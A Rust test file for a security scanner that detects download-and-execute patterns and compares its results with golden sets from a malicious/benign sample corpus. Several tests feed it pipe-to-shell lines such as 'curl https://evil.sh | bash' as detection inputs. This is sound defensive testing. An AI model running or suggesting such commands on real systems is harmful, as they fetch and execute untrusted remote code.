//! Tests for `scanner::analyzers::patterns::scan_patterns`.
//!
//! Step 1: Unit tests (pipe_to_shell flagging + dedup).
//! Step 2: Per-file parity against the Python oracle for each corpus subdir.

use scanner::analyzers::patterns::scan_patterns;
use scanner::context::build_context;
use std::collections::BTreeMap;

// ---------------------------------------------------------------------------
// Step 1: Unit tests
// ---------------------------------------------------------------------------

/// The catalog rule id for "downloads and pipes to an interpreter" is
/// `rce.pipe_to_shell` (confirmed in rules/catalog.yaml).
#[test]
fn pipe_to_shell_flagged_with_file_suffix() {
    let mut fc = BTreeMap::new();
    fc.insert(
        "run.sh".to_string(),
        "curl https://x.sh | bash\n".to_string(),
    );
    let findings = scan_patterns(&fc);
    let hit = findings
        .iter()
        .find(|x| x.rule_id == "rce.pipe_to_shell")
        .expect("rce.pipe_to_shell must be found");
    assert!(
        hit.reason.ends_with("[file: run.sh]"),
        "reason should end with '[file: run.sh]', got: {:?}",
        hit.reason
    );
}

#[test]
fn dedup_same_rule_same_file() {
    let mut fc = BTreeMap::new();
    fc.insert("a.sh".to_string(), "curl a|bash\ncurl b|bash\n".to_string());
    let n = scan_patterns(&fc)
        .iter()
        .filter(|x| x.rule_id == "rce.pipe_to_shell")
        .count();
    assert_eq!(
        n, 1,
        "same rule in same file must be deduplicated to 1 finding"
    );
}

/// Findings from different files are NOT deduplicated — each (rule_id, path) is unique.
#[test]
fn same_rule_different_files_both_reported() {
    let mut fc = BTreeMap::new();
    fc.insert("a.sh".to_string(), "curl a|bash\n".to_string());
    fc.insert("b.sh".to_string(), "curl b|bash\n".to_string());
    let n = scan_patterns(&fc)
        .iter()
        .filter(|x| x.rule_id == "rce.pipe_to_shell")
        .count();
    assert_eq!(
        n, 2,
        "same rule in two different files should produce 2 findings"
    );
}

/// Location is set to the 1-based line number of the first match.
#[test]
fn location_has_correct_line_number() {
    let mut fc = BTreeMap::new();
    // Line 1: safe; Line 2: malicious
    fc.insert(
        "setup.sh".to_string(),
        "echo hello\ncurl https://evil.sh | bash\n".to_string(),
    );
    let findings = scan_patterns(&fc);
    let hit = findings
        .iter()
        .find(|x| x.rule_id == "rce.pipe_to_shell")
        .expect("rce.pipe_to_shell must be found");
    let loc = hit.location.as_ref().expect("location must be set");
    assert_eq!(loc.line, 2, "pipe_to_shell is on line 2");
    assert_eq!(loc.file, "setup.sh");
}

/// owasp and atlas fields are populated from catalog.yaml metadata.
#[test]
fn owasp_and_atlas_populated() {
    let mut fc = BTreeMap::new();
    fc.insert("x.sh".to_string(), "curl https://x.sh | bash\n".to_string());
    let findings = scan_patterns(&fc);
    let hit = findings
        .iter()
        .find(|x| x.rule_id == "rce.pipe_to_shell")
        .expect("rce.pipe_to_shell");
    assert!(
        !hit.owasp.is_empty(),
        "owasp should be non-empty for rce.pipe_to_shell"
    );
    assert!(
        !hit.atlas.is_empty(),
        "atlas should be non-empty for rce.pipe_to_shell"
    );
}

// ---------------------------------------------------------------------------
// Step 2: Per-file parity against committed golden finding sets.
//
// The golden patterns-only rule_id sets below were captured from the Python
// oracle (the deleted Python predecessor's `aidefender scan <dir> --format json`) pre-deletion, filtered to
// patterns rule_ids (NOT ast./taint./yara./mcp./meta./osv.). The Python package
// is now deleted, so these committed goldens are the parity oracle.
//
// Captured goldens (patterns-only):
//   malicious/pipe_skill  => {"rce.pipe_to_shell"}
//   malicious/decode_exec => {}   (only ast.exec + yara.b64_exec, filtered out)
//   malicious/exfil_server=> {}   (only taint + yara, filtered out)
//   malicious/poison_tool => {}
//   benign/hello_skill    => {}
//   benign/util_lib       => {}
// ---------------------------------------------------------------------------

/// Prefix patterns that identify non-patterns analyzers.
fn is_patterns_rule(rule_id: &str) -> bool {
    !rule_id.starts_with("ast.")
        && !rule_id.starts_with("taint.")
        && !rule_id.starts_with("yara.")
        && !rule_id.starts_with("mcp.")
        && !rule_id.starts_with("meta.")
        && !rule_id.starts_with("osv.")
}

/// Run parity for one corpus subdir against the captured golden id set.
/// `corpus_rel` is relative to the repo root.
fn parity_for_dir(corpus_rel: &str, golden: &[&str]) {
    let manifest = env!("CARGO_MANIFEST_DIR");
    let repo_root = std::path::Path::new(manifest)
        .parent()
        .expect("scanner crate inside repo");
    let abs_path = repo_root.join(corpus_rel);

    let ctx = build_context(&abs_path);
    let rust_findings = scan_patterns(&ctx.file_cache);
    let rust_ids: std::collections::BTreeSet<&str> = rust_findings
        .iter()
        .filter(|f| is_patterns_rule(&f.rule_id))
        .map(|f| f.rule_id.as_str())
        .collect();

    let golden_ids: std::collections::BTreeSet<&str> = golden.iter().copied().collect();

    assert_eq!(
        rust_ids, golden_ids,
        "Patterns parity mismatch for {corpus_rel}:\n  Rust:   {:?}\n  Golden: {:?}",
        rust_ids, golden_ids
    );
}

#[test]
fn parity_malicious_pipe_skill() {
    parity_for_dir(
        "scanner/tests/corpus_scan/malicious/pipe_skill",
        &["rce.pipe_to_shell"],
    );
}

#[test]
fn parity_malicious_decode_exec() {
    parity_for_dir("scanner/tests/corpus_scan/malicious/decode_exec", &[]);
}

#[test]
fn parity_malicious_exfil_server() {
    parity_for_dir("scanner/tests/corpus_scan/malicious/exfil_server", &[]);
}

#[test]
fn parity_malicious_poison_tool() {
    parity_for_dir("scanner/tests/corpus_scan/malicious/poison_tool", &[]);
}

#[test]
fn parity_benign_hello_skill() {
    parity_for_dir("scanner/tests/corpus_scan/benign/hello_skill", &[]);
}

#[test]
fn parity_benign_util_lib() {
    parity_for_dir("scanner/tests/corpus_scan/benign/util_lib", &[]);
}
